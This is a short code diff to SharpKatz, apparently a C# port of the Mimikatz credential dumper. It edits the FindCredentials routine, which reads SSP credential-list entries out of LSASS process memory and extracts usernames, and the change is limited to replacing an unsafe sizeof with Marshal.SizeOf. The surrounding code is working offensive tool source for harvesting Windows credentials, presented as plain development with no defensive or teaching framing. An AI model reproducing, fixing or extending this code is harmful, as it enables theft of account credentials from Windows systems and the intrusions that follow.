@@ -27,7 +27,7 @@ namespace SharpKatz.Module
             public Msv1.KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
         };
 
-        public static unsafe int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
             IntPtr sspCredentialListAddr;
@@ -42,7 +42,7 @@ namespace SharpKatz.Module
 
             do
             {
-                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(sizeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
+                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY))));
                 entry = Utility.ReadStruct<KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);
 
                 string username = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.UserName);
